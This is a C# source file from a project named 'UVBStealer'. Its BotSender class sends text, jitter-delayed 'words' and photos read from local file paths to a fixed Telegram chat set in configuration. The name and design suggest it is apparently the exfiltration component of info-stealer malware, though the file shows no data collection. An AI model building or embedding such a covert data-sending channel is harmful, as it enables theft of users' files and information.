using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Logging;
using Telegram.Bot;
using Telegram.Bot.Types;

namespace UVBStealer;

public class BotSender
{
    private readonly TelegramBotClient _bot;
    private readonly long _targetChatId;
    private readonly int _minJitter;
    private readonly int _maxJitter;
    private readonly ILogger<BotSender> _logger;
    private readonly Random _random = new();

    public BotSender(IConfiguration config, ILogger<BotSender> logger)
    {
        _logger = logger;

        var token = config["Bot:Token"]
            ?? throw new InvalidOperationException("Bot:Token is not configured");

        var chatIdStr = config["Bot:TargetChatId"]
            ?? throw new InvalidOperationException("Bot:TargetChatId is not configured");

        _targetChatId = long.Parse(chatIdStr);
        _minJitter = config.GetValue("Jitter:MinSeconds", 1);
        _maxJitter = config.GetValue("Jitter:MaxSeconds", 5);

        _bot = new TelegramBotClient(token);
    }

    public TelegramBotClient Client => _bot;

    public async Task SendMessageAsync(long chatId, string text, CancellationToken ct = default)
    {
        await _bot.SendMessage(chatId, text, cancellationToken: ct);
    }

    public async Task SendPhotoAsync(string filePath, CancellationToken ct = default)
    {
        await using var stream = File.OpenRead(filePath);
        var fileName = Path.GetFileName(filePath);
        await _bot.SendPhoto(_targetChatId, InputFile.FromStream(stream, fileName), cancellationToken: ct);
    }

    public async Task SendWordAsync(string word, CancellationToken ct = default)
    {
        var delay = _random.Next(_minJitter, _maxJitter + 1);
        _logger.LogInformation("Sending word '{Word}' with {Delay}s jitter", word, delay);

        await Task.Delay(TimeSpan.FromSeconds(delay), ct);
        await _bot.SendMessage(_targetChatId, word, cancellationToken: ct);

        _logger.LogInformation("Word '{Word}' sent successfully", word);
    }
}
